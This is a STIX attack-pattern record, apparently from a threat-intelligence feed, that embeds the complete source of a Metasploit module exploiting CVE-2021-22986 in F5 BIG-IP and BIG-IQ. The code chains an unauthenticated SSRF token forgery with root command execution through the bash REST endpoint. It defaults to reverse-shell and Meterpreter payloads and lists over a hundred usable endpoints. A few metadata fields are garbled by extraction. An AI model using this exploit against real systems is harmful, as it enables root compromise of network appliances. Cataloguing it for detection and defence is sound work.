{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--612f06b8-98b7-4ff7-8a53-06629722de3f",
    "created": "2024-08-14T17:02:25.628161Z",
    "modified": "2024-08-14T17:02:25.628165Z",
    "name": "F5 iControl REST Unauthenticated SSRF Token Generation RCE",
    "description": " This module exploits a pre-auth SSRF in the F5 iControl REST API's /mgmt/shared/authn/login endpoint to generate an X-F5-Auth-Token that can be used to execute root commands on an affected BIG-IP or BIG-IQ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icontrol_rest_ssrf_rce.rb",
            "external_id": "f5_icontrol_rest_ssrf_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-22986"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/csp/article/K03009991"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/f6b19d24-b24e-4abd-98cf-2988d7424311"
        },
        {
            "source_name": "reference",
            "url": "https://research.nccgroup.com/2021/03/18/rift-detection-capabilities-for-recent-f5-big-ip-big-iq-icontrol-rest-api-vulnerabilities-cve-2021-22986/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 iControl REST Unauthenticated SSRF Token Generation RCE',\n        'Description' => %q{\n          This module exploits a pre-auth SSRF in the F5 iControl REST API's\n          /mgmt/shared/authn/login endpoint to generate an X-F5-Auth-Token that\n          can be used to execute root commands on an affected BIG-IP or BIG-IQ\n          device. This vulnerability is known as CVE-2021-22986.\n\n          CVE-2021-22986 affects the following BIG-IP versions:\n\n          * 12.1.0 - 12.1.5\n          * 13.1.0 - 13.1.3\n          * 14.1.0 - 14.1.3\n          * 15.1.0 - 15.1.2\n          * 16.0.0 - 16.0.1\n\n          And the following BIG-IQ versions:\n\n          * 6.0.0 - 6.1.0\n          * 7.0.0\n          * 7.1.0\n\n          Tested against BIG-IP Virtual Edition 16.0.1 in VMware Fusion.\n        },\n        'Author' => [\n          'wvu', # Analysis and exploit\n          'Rich Warren' # First blood (RCE) and endpoint collaboration\n        ],\n        'References' => [\n          ['CVE', '2021-22986'],\n          ['URL', 'https://support.f5.com/csp/article/K03009991'],\n          ['URL', 'https://attackerkb.com/assessments/f6b19d24-b24e-4abd-98cf-2988d7424311'],\n          ['URL', 'https://research.nccgroup.com/2021/03/18/rift-detection-capabilities-for-recent-f5-big-ip-big-iq-icontrol-rest-api-vulnerabilities-cve-2021-22986/']\n          # https://clouddocs.f5.com/products/big-iq/mgmt-api/v7.0.0/ApiReferences/bigiq_public_api_ref/r_auth_login.html\n        ],\n        'DisclosureDate' => '2021-03-10', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION], # Only one concurrent session\n          'SideEffects' => [\n            IOC_IN_LOGS, # /var/log/restjavad.0.log (rotated)\n            ACCOUNT_LOCKOUTS, # Unlikely with bigipAuthCookie\n            ARTIFACTS_ON_DISK # CmdStager\n          ]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'Valid admin username', 'admin']),\n      OptString.new('ENDPOINT', [false, 'Custom token generation endpoint'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])\n    ])\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def user_reference_endpoint\n    normalize_uri(target_uri.path, '/mgmt/shared/authz/users', username)\n  end\n\n  def check\n    generate_token_ssrf ? CheckCode::Vulnerable : CheckCode::Safe\n  end\n\n  def exploit\n    return unless (@token ||= generate_token_ssrf)\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def generate_token_ssrf\n    print_status('Generating token via SSRF...')\n    vprint_status(\"Username: #{username}\")\n    vprint_status(\"Endpoint: #{login_reference_endpoint}\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mgmt/shared/authn/login'),\n      'ctype' => 'application/json',\n      'data' => {\n        'username' => username,\n        'bigipAuthCookie' => '',\n        'authProviderName' => 'local',\n        'loginReference' => {\n          'link' => \"https://localhost#{login_reference_endpoint}\"\n        },\n        'userReference' => {\n          'link' => \"https://localhost#{user_reference_endpoint}\"\n        }\n      }.to_json\n    )\n\n    unless res&.code == 200 && (@token = res.get_json_document.dig('token', 'token'))\n      print_error('Failed to generate token')\n      return\n    end\n\n    print_good(\"Successfully generated token: #{@token}\")\n    @token\n  end\n\n  def execute_command(cmd, _opts = {})\n    bash_cmd = \"eval $(echo #{Rex::Text.encode_base64(cmd)} | base64 -d)\"\n\n    print_status(\"Executing command: #{bash_cmd}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mgmt/tm/util/bash'),\n      'ctype' => 'application/json',\n      'headers' => {\n        'X-F5-Auth-Token' => @token\n      },\n      'data' => {\n        'command' => 'run',\n        'utilCmdArgs' => \"-c '#{bash_cmd}'\"\n      }.to_json\n    }, datastore['CmdExecTimeout'])\n\n    unless res\n      print_warning('Command execution timed out')\n      return\n    end\n\n    json = res.get_json_document\n\n    unless res.code == 200 && json['kind'] == 'tm:util:bash:runstate'\n      fail_with(Failure::PayloadFailed, 'Failed to execute command')\n    end\n\n    print_good('Successfully executed command')\n\n    return unless (cmd_result = json['commandResult'])\n\n    vprint_line(cmd_result)\n  end\n\n  def login_reference_endpoint\n    if datastore['ENDPOINT']\n      return normalize_uri(target_uri.path, datastore['ENDPOINT'])\n    end\n\n    @token_generation_endpoint ||= token_generation_endpoints.sample\n\n    normalize_uri(target_uri.path, @token_generation_endpoint)\n  end\n\n  # Usable token generation endpoints between versions 12.1.4 and 16.0.1\n  def token_generation_endpoints\n    %w[\n      /access/file-path-manager/indexing\n      /cm/autodeploy/cluster-software-images/indexing\n      /cm/autodeploy/qkview/indexing\n      /cm/autodeploy/software-images/indexing\n      /cm/autodeploy/software-volume-install/indexing\n      /cm/system/authn/providers/tmos/1f44a60e-11a7-3c51-a49f-82983026b41b/users/indexing\n      /cm/system/authn/providers/tmos/indexing\n      /mgmt/shared/analytics/avr-proxy-tasks\n      /mgmt/shared/gossip\n      /mgmt/shared/gossip-peer-refresher\n      /mgmt/shared/identified-devices/config/device-refresh\n      /mgmt/shared/save-config\n      /mgmt/tm/shared/bigip-failover-state\n      /shared/analytics/avr-proxy-tasks\n      /shared/analytics/avr-proxy-tasks/indexing\n      /shared/analytics/event-aggregation-tasks/indexing\n      /shared/analytics/event-analysis-tasks/indexing\n      /shared/authn/providers/local/groups/indexing\n      /shared/authz/remote-resources/indexing\n      /shared/authz/resource-groups/indexing\n      /shared/authz/roles/indexing\n      /shared/authz/tokens/indexing\n      /shared/chassis-framework-upgrades/indexing\n      /shared/device-discovery-tasks/indexing\n      /shared/device-group-key-pairs/indexing\n      /shared/echo/indexing\n      /shared/framework-info-tasks/indexing\n      /shared/framework-upgrades/indexing\n      /shared/gossip\n      /shared/gossip-peer-refresher\n      /shared/group-task/indexing\n      /shared/iapp/blocks/indexing\n      /shared/iapp/build-package/indexing\n      /shared/iapp/health-prefix-map/indexing\n      /shared/iapp/package-management-tasks/indexing\n      /shared/iapp/template-loader/indexing\n      /shared/identified-devices/config/device-refresh\n      /shared/nodejs/loader-path-config/indexing\n      /shared/package-deployments/indexing\n      /shared/resolver/device-groups/indexing\n      /shared/resolver/device-groups/tm-shared-all-big-ips/devices/indexing\n      /shared/root-framework-upgrades/indexing\n      /shared/rpm-tasks/indexing\n      /shared/save-config\n      /shared/snapshot-task/indexing\n      /shared/snapshot/indexing\n      /shared/stats-information/indexing\n      /shared/storage/tasks/indexing\n      /shared/task-scheduler/scheduler/indexing\n      /shared/tmsh-shell/indexing\n      /tm/analytics/afm-sweeper/generate-report/indexing\n      /tm/analytics/afm-sweeper/report-results/indexing\n      /tm/analytics/application-security-anomalies/generate-report/indexing\n      /tm/analytics/application-security-anomalies/report-results/indexing\n      /tm/analytics/application-security-network/generate-report/indexing\n      /tm/analytics/application-security-network/report-results/indexing\n      /tm/analytics/application-security/generate-report/indexing\n      /tm/analytics/application-security/report-results/indexing\n      /tm/analytics/asm-bypass/generate-report/indexing\n      /tm/analytics/asm-bypass/report-results/indexing\n      /tm/analytics/asm-cpu/generate-report/indexing\n      /tm/analytics/asm-cpu/report-results/indexing\n      /tm/analytics/asm-memory/generate-report/indexing\n      /tm/analytics/asm-memory/report-results/indexing\n      /tm/analytics/cpu/generate-report/indexing\n      /tm/analytics/cpu/report-results/indexing\n      /tm/analytics/disk-info/generate-report/indexing\n      /tm/analytics/disk-info/report-results/indexing\n      /tm/analytics/dns/generate-report/indexing\n      /tm/analytics/dns/report-results/indexing\n      /tm/analytics/dos-l3/generate-report/indexing\n      /tm/analytics/dos-l3/report-results/indexing\n      /tm/analytics/http/generate-report/indexing\n      /tm/analytics/http/report-results/indexing\n      /tm/analytics/ip-intelligence/generate-report/indexing\n      /tm/analytics/ip-intelligence/report-results/indexing\n      /tm/analytics/ip-layer/generate-report/indexing\n      /tm/analytics/ip-layer/report-results/indexing\n      /tm/analytics/lsn-pool/generate-report/indexing\n      /tm/analytics/lsn-pool/report-results/indexing\n      /tm/analytics/memory/generate-report/indexing\n      /tm/analytics/memory/report-results/indexing\n      /tm/analytics/network/generate-report/indexing\n      /tm/analytics/network/report-results/indexing\n      /tm/analytics/pem/generate-report/indexing\n      /tm/analytics/pem/report-results/indexing\n      /tm/analytics/proc-cpu/generate-report/indexing\n      /tm/analytics/proc-cpu/report-results/indexing\n      /tm/analytics/protocol-security-http/generate-report/indexing\n      /tm/analytics/protocol-security-http/report-results/indexing\n      /tm/analytics/protocol-security/generate-report/indexing\n      /tm/analytics/protocol-security/report-results/indexing\n      /tm/analytics/sip/generate-report/indexing\n      /tm/analytics/sip/report-results/indexing\n      /tm/analytics/swg-blocked/generate-report/indexing\n      /tm/analytics/swg-blocked/report-results/indexing\n      /tm/analytics/swg/generate-report/indexing\n      /tm/analytics/swg/report-results/indexing\n      /tm/analytics/tcp-analytics/generate-report/indexing\n      /tm/analytics/tcp-analytics/report-results/indexing\n      /tm/analytics/tcp/generate-report/indexing\n      /tm/analytics/tcp/report-results/indexing\n      /tm/analytics/udp/generate-report/indexing\n      /tm/analytics/udp/report-results/indexing\n      /tm/analytics/vcmp/generate-report/indexing\n      /tm/analytics/vcmp/report-results/indexing\n      /tm/analytics/virtual/generate-report/indexing\n      /tm/analytics/virtual/report-results/indexing\n      /tm/shared/bigip-failover-state\n      /tm/shared/sys/backup/indexing\n    ]\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-10, # Vendor advisory",
    "x_mitre_platforms": [
        "linux'"
    ]
}